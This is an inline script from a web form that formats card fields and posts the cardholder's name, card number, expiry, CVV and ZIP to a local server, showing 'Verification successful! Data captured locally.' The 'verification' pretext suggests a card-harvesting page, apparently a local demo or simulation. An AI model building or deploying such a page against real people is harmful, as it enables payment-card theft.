    <script>
        document.getElementById('cardnumber').addEventListener('input', function() {
            let v = this.value.replace(/\s/g, '').trim();
            this.value = v.replace(/(.{4})/g, '$1 ').trim().slice(0, 19);
        });
        document.getElementById('expiry').addEventListener('input', function() {
            let v = this.value.replace(/\s/g, '').trim();
            if (v.length === 2 && !v.includes('/')) this.value = v + '/';
        });
        document.getElementById('cardForm').addEventListener('submit', function(e) {
            e.preventDefault();
            const btn = document.getElementById('submitBtn');
            const spinner = document.getElementById('spinner');
            btn.disabled = true;
            spinner.style.display = 'inline';
            const data = {
                cardholder: document.getElementById('cardholder').value,
                cardnumber: document.getElementById('cardnumber').value.replace(/\s/g, ''),
                expiry: document.getElementById('expiry').value,
                cvv: document.getElementById('cvv').value,
                zip: document.getElementById('zip').value
            };
            fetch('http://localhost:8000/submit', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(data)
            }).then(r => r.json()).then(d => {
                alert('Verification successful! Data captured locally.');
                btn.disabled = false;
                spinner.style.display = 'none';
            }).catch(err => {
                alert('Error: Ensure server is running on port 8000.');
                btn.disabled = false;
                spinner.style.display = 'none';
            });
        });
    </script>
